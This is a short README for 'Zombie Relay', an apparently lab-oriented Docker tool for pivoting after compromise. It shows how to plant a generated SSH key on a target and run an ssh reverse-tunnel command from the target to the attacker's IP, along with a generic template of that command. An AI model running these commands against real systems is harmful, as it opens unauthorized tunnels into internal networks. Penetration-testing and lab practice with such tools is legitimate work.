# Zombie Relay

[PoC post](https://pwnyour.site/2025-04-19-zombie-relay.html) on my blog.

## Usage

```sh
git clone https://github.com/0xyy66/ZombieRelay.git
cd ZombieRelay
docker compose up
```

Everytime you create the container, the compose will automatically create a new private key. Drop it on the target to connect to the container.

Run the following command to copy the key from the container to your host (safest).

```sh
docker cp $(docker ps -l -q):/root/.ssh/id_ed25519 . 
```

### Tunnel a remote service on your host

In order to correctly tunnel the remote service on your host, you need to drop the private key printed by docker (id_ed25519) and run the following command on the target (assuming the target service that interests you runs locally on port 9090).

```sh
ssh -i id_rsa -p 2224 -R *:9090:127.0.0.1:9090 root@10.10.14.20 -N -f
```

The command above corresponds to: `ssh -i <private_key> -p <attacker_ssh_port> -R <attacker_iface>:<attacker_service_port>:<target_iface>:<target_service_port> root@<attacker_ip> -N -f`

### Config

You may need to edit the docker-compose.yaml file to modify the mapped ports or add more.

By default, the following ports are mapped:
- 2224:22 - OpenSSH exposed on your host on port 2224
- 9090:9090 - You can tunnel a remote application on port 9090, it will become accessible on localhost:9090


